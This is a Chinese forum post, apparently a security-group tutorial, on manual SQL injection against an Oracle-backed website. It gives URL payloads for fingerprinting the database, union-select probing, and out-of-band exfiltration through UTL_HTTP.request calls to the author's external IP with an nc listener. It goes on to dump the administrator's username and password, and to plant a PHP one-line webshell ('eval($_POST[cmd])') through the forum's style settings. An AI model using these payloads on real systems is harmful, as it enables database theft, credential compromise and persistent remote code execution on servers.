@@ -1,0 +1,253 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+手注oracle技术【试读篇】
+D8888D主贴内容-------------------------------------------------------
+作者：山东信息安全小组 Black.Eagle                
+声明：笔者在与该网站的站长及负责人联系后做的测试，征得对方同意后放出文章
+
+估计大家读了《oracle注入实战之渗透联通》一文之后都会为之一震，但是笔者不知道读者朋友有没有遇到过和笔者相似的情况，就是用union select语句爆全部的表的时候，根本爆不出来，最多也就能爆出几个来，那该怎么继续呢？这里就用到了我们的UTL_HTTP反弹注射。
+
+●     判断注入点
+
+手工判断注入点估计大家都会了，笔者通过返回的信息“java.sql.SQLException: ORA-01756”初步判断为oracle的数据库。
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120214957.jpg[/img]
+●     判断数据库类型
+
+在url后面添加“/*”，返回错误页面，排除了mysql数据库的可能
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120215610.jpg[/img]
+
+在url后面添加“--”显示正常页面，说明数据库可能为mssql或者oracle
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120215970.jpg[/img]
+为了进一步验证为oracle数据库，笔者在url后添加:“and (select count (*) from user_tables)>0--”显示正常页面，说明为oracle的数据库。
+注：user_tables是oracle数据库特有的表
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120216775.jpg[/img]
+
+● 猜解字段
+
+笔者提交：order by 7--返回正确页面
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120217453.jpg[/img]
+继续提交order by 8—返回了错误页面，这就证实了当前表存在7个字段
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120217568.jpg[/img]
+●     测试字段类型
+
+笔者提交：union select null,null,null,null,null,null,null from dual返回正常页面。证实了字段的确为七个
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120218883.jpg[/img]
+那接下来做的就是判断字段的类型了，因为字符型的字段位置处才能插入我们要查询的一些内容
+
+笔者依次测试提交：
+
+union%20select%20'null',null,null,null,null,null,null%20from%20dual
+
+union%20select%20null,'null',null,null,null,null,null%20from%20dual
+
+union%20select%20null,null,'null',null,null,null,null%20from%20dual
+
+union%20select%20null,null,null,'null',null,null,null%20from%20dual
+
+……
+
+这样依次提交，当测试完七个字段的时候，笔者发现1，3，4，6，7位置处为字符型。
+
+提交：and%201=2%20union%20select%20'1',2,'3','4',5,'6','7'%20from%20dual
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120218830.jpg[/img]
+笔者测试了下Oracle数据库的版本，提交：
+
+and%201=2%20union%20select%20(select%20banner%20from%20sys.v_$version%20where%20rownum=1),2,'3','4',5,'6','7'%20from%20dual，显示为oracle 10g
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120219943.jpg[/img]
+
+
+并且判断出了当前连接用户为TOTO，提交语句：
+
+and%201=2%20union%20select%20(select%20SYS_CONTEXT%20('USERENV',%20'CURRENT_USER')%20from%20dual),2,'3','4',5,'6','7'%20from%20dual
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120220723.jpg[/img]
+
+
+
+
+
+爆表的时候笔者就遇到了麻烦，就是当提交：
+
+and%201=2%20union%20select%20TABLE_NAME,2,'3','4',5,'6','7'%20from%20USER_TABLES 时，本来是想爆出所有的用户表，可能由于表比较多，而页面处用于显示的长度不够导致部分表显示出来，下面就要用到UTL_HTTP反弹注射。
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120220160.jpg[/img]
+
+
+●     UTL_HTTP反弹注射之旅
+
+反弹注射之前我们要判断一下UTL_HTTP包是否存在
+
+构造语句: 
+
+and%20(select%20count(*)%20from%20all_objects%20where%20object_name='UTL_HTTP')>0--
+
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120221161.jpg[/img]
+
+
+返回成功，可以利用。
+
+首先本机用NC监听某个未利用的端口3300.
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120221683.jpg[/img]
+
+url处提交：
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select banner from sys.v_$version where rownum=1))=1--
+
+其中“60.2x.64.24”为笔者的外网IP地址
+
+这样在本地就监听到了来自oracle机器的数据。并显示了oracle的数据库版本
+
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120222415.jpg[/img]
+
+
+
+这里需要提醒大家的是每在url提交一次请求，nc监听完之后会断开，需要重新启动nc监听。
+
+接下来要做的就是常规的体力活了。暴库，暴表，暴字段
+
+①首先是暴库，提交：
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select owner from all_tables where rownum=1))=1--
+
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120222630.jpg[/img]
+
+
+
+这里返回了第一个库SYS.
+
+继续提交：
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select owner from all_tables where owner<>'SYS' and rownum=1))=1--
+
+即查询库名不等于SYS的库。
+
+[img][img][/img][/img][img]http://www.7747.net/Article/UploadFiles/201002/20100204120222421.jpg[/img]
+
+
+成功返回第二个库OUTLN
+
+笔者又依次提交
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select owner from all_tables where owner<>'SYS' and owner<>'OUTLN' and rownum=1))=1--
+
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select owner from all_tables where owner<>'SYS' and owner<>'OUTLN' and owner <>'SYSTEM' and rownum=1))=1--
+
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select owner from all_tables where owner<>'SYS' and owner<>'OUTLN' and owner <>'SYSTEM' and owner <>'TSMSYS' and rownum=1))=1—
+
+……
+
+
+
+这样依次论推，知道最后NC的“GET /”后面没有了数据，库就暴完了。
+
+经笔者测试这里的数据库为TOTO 
+
+②然后是爆表
+
+提交：
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select TABLE_NAME from all_tables where owner='TOTO' and rownum=1))=1--
+
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120223458.jpg[/img]
+
+
+
+爆出第一张表ACCOUNTS
+
+提交：
+
+and%20UTL_HTTP.request('http://60.2x.64.24:3300/'||(select%20TABLE_NAME%20from%20all_tables%20where%20owner='TOTO'%20and%20TABLE_NAME<>'ACCOUNTS'%20and%20rownum=1))=1--
+
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120223981.jpg[/img]
+
+
+获得了第二章表 A_USER。
+
+笔者又依次提交
+
+and%20UTL_HTTP.request('http://60.2x.64.24:3300/'||(select%20TABLE_NAME%20from%20all_tables%20where%20owner='TOTO'%20and%20TABLE_NAME<>'ACCOUNTS'%20 and%20TABLE_NAME<>'A_USER' and%20rownum=1))=1--
+
+
+and%20UTL_HTTP.request('http://60.2x.64.24:3300/'||(select%20TABLE_NAME%20from%20all_tables%20where%20owner='TOTO'%20and%20TABLE_NAME<>'ACCOUNTS'%20 and%20TABLE_NAME<>'A_USER'%20and%20TABLE_NAME<>'CITY' and%20rownum=1))=1--
+
+
+……
+
+
+
+这样又爆出了表名：USERMG
+
+③     爆列名
+
+提交：
+
+
+and%20UTL_HTTP.request('http://60.2x.64.24:3300/'||(select%20COLUMN_NAME%20from%20COLS%20where%20table_name='USERMG'%20and%20rownum=1))=1--
+
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120223507.jpg[/img]
+
+
+这样就获得了第一个字段名
+
+接着构造注入语句
+
+and%20UTL_HTTP.request('http://60.211.64.24:3300/'||(select%20COLUMN_NAME%20from%20COLS%20where%20table_name='USERMG'%20and%20rownum=1))=1--
+
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120227513.jpg[/img]
+
+顺利得到第二个字段USER_PASS
+
+经过笔者测试，字段值确实为这两个
+
+④     既然我们表名，列名都有了，那我们就来构造语句获得具体的值吧
+
+提交：
+
+and%201=2%20union%20select%20USER_NAME,2,USER_PASS,'4',5,'6','7'%20from%20USERMG
+
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120228635.jpg[/img]
+
+
+
+即可以获得了系统管理员的账号密码
+
+●     登录。进取shell.
+
+笔者发现只有登录后基本没有利用的地方，唯独论坛是个突破口。
+
+恰巧系统管理的密码和注出的密码相同。成功登陆
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120228368.jpg[/img]
+
+
+【论坛管理】-【界面风格】
+
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120228773.jpg[/img]
+
+【默认风格】-【详情】 新增变量 
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120229509.jpg[/img]
+
+
+变量内容为 ', '#999');eval($_POST[cmd]);// 替换内容随便写，提交之后用一句话木马连接论坛这个页面/forumdata/cache/style_1.php 密码为cmd,获得一句话小马。
+
+Webshell详情：
+
+[img]http://www.7747.net/Article/UploadFiles/201002/20100204120230618.jpg[/img]
+
+
+这篇文章算是山东信息安全小组【S.I.S.T】对大家的新春贺礼了
